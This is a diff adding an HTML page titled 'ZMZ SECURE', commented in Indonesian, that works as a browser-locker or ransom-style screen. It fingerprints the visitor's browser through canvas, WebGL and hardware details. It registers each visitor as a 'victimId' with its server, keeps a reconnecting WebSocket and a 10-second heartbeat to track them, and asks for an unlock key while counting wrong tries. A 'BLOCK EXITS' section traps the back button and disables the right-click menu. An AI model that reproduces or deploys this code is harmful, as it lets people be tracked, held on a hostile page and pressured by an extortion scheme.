@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⚡ ZMZ SECURE ⚡</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+        
+        body {
+            background: #0a0a0a;
+            color: #0ff;
+            font-family: 'Courier New', monospace;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .container {
+            background: #111;
+            border: 3px solid #f0f;
+            box-shadow: 0 0 100px #f0f;
+            padding: 30px;
+            border-radius: 40px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #f0f;
+            font-size: 2rem;
+            margin-bottom: 20px;
+            text-shadow: 0 0 20px #f0f;
+        }
+        
+        .info {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 20px;
+            margin: 15px 0;
+            font-size: 0.9rem;
+            border-left: 4px solid #0ff;
+        }
+        
+        input {
+            background: #000;
+            border: 3px solid #0ff;
+            color: #0ff;
+            font-size: 2rem;
+            padding: 15px;
+            width: 100%;
+            border-radius: 50px;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        button {
+            background: linear-gradient(45deg, #f0f, #90f);
+            color: white;
+            border: none;
+            font-size: 1.8rem;
+            padding: 15px;
+            width: 100%;
+            border-radius: 50px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        #status {
+            margin-top: 20px;
+            color: #ffaa00;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 ZMZ SECURE</h1>
+        
+        <div class="info" id="info">
+            MENGINISIALISASI...
+        </div>
+        
+        <input type="password" id="keyInput" placeholder="KEY" autofocus>
+        <button id="unlockBtn">UNLOCK</button>
+        
+        <div id="status">⚡ SERVER CONNECTED ⚡</div>
+    </div>
+
+    <script>
+        // ========== KONFIGURASI ==========
+        const SERVER_URL = window.location.origin;
+        let victimId = null;
+        let attempts = 0;
+        let ws = null;
+        let fingerprint = null;
+        
+        // ========== GENERATE FINGERPRINT ==========
+        function generateFingerprint() {
+            const components = [
+                navigator.userAgent,
+                navigator.language,
+                screen.width + 'x' + screen.height,
+                screen.colorDepth,
+                new Date().getTimezoneOffset(),
+                navigator.hardwareConcurrency,
+                navigator.deviceMemory || 'unknown',
+                !!navigator.webdriver,
+                !!window.chrome,
+                navigator.platform
+            ];
+            
+            // Canvas fingerprint
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 100;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = '#f00';
+            ctx.fillRect(10, 10, 100, 50);
+            ctx.fillStyle = '#00f';
+            ctx.font = '20px Arial';
+            ctx.fillText('ZMZ', 20, 60);
+            const canvasData = canvas.toDataURL();
+            components.push(canvasData);
+            
+            // WebGL fingerprint
+            try {
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+                        components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+                    }
+                }
+            } catch(e) {}
+            
+            // Hash
+            const str = components.join('|');
+            let hash = 0;
+            for(let i=0; i<str.length; i++) {
+                hash = ((hash << 5) - hash) + str.charCodeAt(i);
+                hash = hash & hash;
+            }
+            
+            return hash.toString(16) + '_' + Date.now().toString(36);
+        }
+        
+        // ========== REGISTER KE SERVER ==========
+        async function register() {
+            fingerprint = generateFingerprint();
+            
+            try {
+                const response = await fetch(`${SERVER_URL}/api/register`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        fingerprint: fingerprint,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                const data = await response.json();
+                victimId = data.victimId;
+                
+                document.getElementById('info').innerHTML = `
+                    ID: ${victimId.substring(0, 8)}...<br>
+                    KEY: ${data.key}<br>
+                    PERCOBAAN: ${data.attempts}
+                `;
+                
+                // Connect WebSocket
+                connectWebSocket();
+                
+                // Start heartbeat
+                startHeartbeat();
+                
+            } catch (error) {
+                document.getElementById('info').innerHTML = '⚠️ SERVER ERROR';
+            }
+        }
+        
+        // ========== WEBSOCKET ==========
+        function connectWebSocket() {
+            ws = new WebSocket(`ws://${window.location.host}`);
+            
+            ws.onopen = () => {
+                ws.send(JSON.stringify({
+                    type: 'register',
+                    victimId: victimId
+                }));
+            };
+            
+            ws.onclose = () => {
+                // Coba reconnect setelah 1 detik
+                setTimeout(connectWebSocket, 1000);
+            };
+        }
+        
+        // ========== HEARTBEAT ==========
+        function startHeartbeat() {
+            setInterval(async () => {
+                try {
+                    await fetch(`${SERVER_URL}/api/heartbeat`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ victimId })
+                    });
+                    
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({
+                            type: 'heartbeat',
+                            victimId: victimId
+                        }));
+                    }
+                    
+                } catch(e) {}
+            }, 10000); // tiap 10 detik
+        }
+        
+        // ========== UNLOCK HANDLER ==========
+        document.getElementById('unlockBtn').addEventListener('click', async function() {
+            const key = document.getElementById('keyInput').value;
+            
+            try {
+                const response = await fetch(`${SERVER_URL}/api/attempt`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ victimId, key })
+                });
+                
+                const data = await response.json();
+                
+                if (data.correct) {
+                    // UNLOCKED
+                    alert('✅ BENAR! MENGALIHKAN...');
+                    
+                    await fetch(`${SERVER_URL}/api/unlock`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ victimId })
+                    });
+                    
+                    window.location.href = 'https://www.google.com';
+                } else {
+                    // SALAH
+                    attempts++;
+                    document.getElementById('info').innerHTML = `
+                        ID: ${victimId.substring(0, 8)}...<br>
+                        ❌ SALAH! PERCOBAAN: ${data.attempts}
+                    `;
+                    
+                    if (navigator.vibrate) navigator.vibrate(500);
+                    document.getElementById('keyInput').value = '';
+                }
+                
+            } catch(error) {
+                alert('❌ SERVER ERROR');
+            }
+        });
+        
+        // Enter key
+        document.getElementById('keyInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('unlockBtn').click();
+            }
+        });
+        
+        // ========== BLOCK EXITS ==========
+        history.pushState(null, null, location.href);
+        window.onpopstate = function() {
+            history.pushState(null, null, location.href);
+            if (navigator.vibrate) navigator.vibrate(200);
+        };
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        // ========== START ==========
+        register();
+    </script>
+</body>
+</html>
